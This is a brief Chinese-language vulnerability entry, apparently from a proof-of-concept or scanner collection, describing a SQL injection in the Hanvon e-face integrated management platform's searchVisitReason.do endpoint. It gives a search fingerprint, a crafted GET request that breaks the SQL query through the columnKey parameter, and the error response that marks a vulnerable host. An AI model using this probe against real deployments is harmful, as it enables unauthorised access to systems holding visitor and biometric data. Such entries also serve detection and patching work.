# 汉王e脸通综合管理平台searchVisitReason.do存在SQL注入漏洞

汉王e脸通综合管理平台 ｜ SQL注入 ｜ —
- **指纹**：`body="async src=\"`
- **请求**：`GET /manage/visitorConfigManage/searchVisitReason.do?branchId=1&columnKey=(&deviceName=test&id=1&order=desc&page=1&pageSize=10&recoToken=SGUsqvF7cVS&type=1&start=2025-06-25&end=2025-06-25&groupId=1`
- **响应特征**：200 Error querying database